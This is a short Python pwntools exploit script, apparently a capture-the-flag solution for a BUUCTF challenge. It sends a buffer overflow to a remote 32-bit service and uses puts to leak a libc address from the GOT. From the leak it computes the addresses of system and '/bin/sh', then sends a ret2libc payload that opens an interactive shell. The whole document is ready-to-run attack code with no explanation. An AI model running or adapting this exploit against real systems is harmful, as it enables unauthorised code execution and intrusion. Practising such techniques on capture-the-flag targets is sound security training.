from pwn import *

context.log_level = "debug"

exe = ELF("./pwn")
# libc = exe.libc
libc = ELF("./libc-2.23.so")
# r = exe.process()
r = remote("node4.buuoj.cn", 29051)
main = p32(0x8048825)


r.send(b"\x00" + b"\xff" * 9)
r.recvuntil(b"t\n")
r.send(cyclic(0xEB) + p32(exe.plt["puts"]) + main + p32(exe.got["puts"]))
libc_puts = u32(r.recvline().strip())
libc_base = libc_puts - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
r.send(b"\x00" + b"\xff" * 9)
r.recvuntil(b"t\n")
r.send(cyclic(0xEB) + p32(system_addr) + p32(0) + p32(bin_sh_addr))
r.interactive()
